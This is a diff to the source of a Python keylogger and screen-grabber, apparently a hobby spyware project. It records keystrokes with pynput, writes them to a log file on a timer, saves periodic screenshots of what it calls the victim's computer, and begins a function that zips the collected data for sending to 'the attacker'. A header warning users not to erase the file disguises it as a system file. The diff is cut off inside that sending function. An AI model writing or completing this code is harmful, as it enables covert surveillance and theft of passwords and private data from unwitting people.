@@ -9,8 +9,9 @@ THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE!!
 from pynput import keyboard
 import pyautogui as pygrab
 import threading
-import smtplib
+import mechanize
 import zipfile, sys, os, time
+import subprocess
 
 log = ''
 
@@ -59,9 +60,12 @@ Logging to a file every 5 seconds
 '''
 def log_to_file():
 	global log
+	# open file
 	f = open(make_get_dir() + 'log.txt', 'w')
+	# write log to file
 	f.write(log)
-	clock = threading.Timer(5, log_to_file)
+	# every 30 seconds invoke this function
+	clock = threading.Timer(30, log_to_file)
 	clock.start()
 
 '''
@@ -78,18 +82,24 @@ Take a screenshot of the victions computer
 every minute and save it to /tmp/folder directory
 '''
 def save_screen():
+	# take a screenshot
 	image = pygrab.screenshot()
+	# get time to append to image file name
 	time = make_name()
+	# save image to the directory that was created
 	image.save(r'/tmp/folder/normal_' + time + '.png')
-	take_screen = threading.Timer(60, save_screen)
+	# repeat function every two minutes
+	take_screen = threading.Timer(120, save_screen)
 	take_screen.start()
 
 '''
 Zip the folder that was created and 
 email the zipped folder to the attacker
+Params : directory to zip, name of zipped file
 '''
 def zip_and_send(direc, zip_name):
-	# create zipped file and send every 24 hrs!!!!
+	# create browser
+	brow = mechanize.Browser()
 		     
 	
 if __name__ == '__main__':
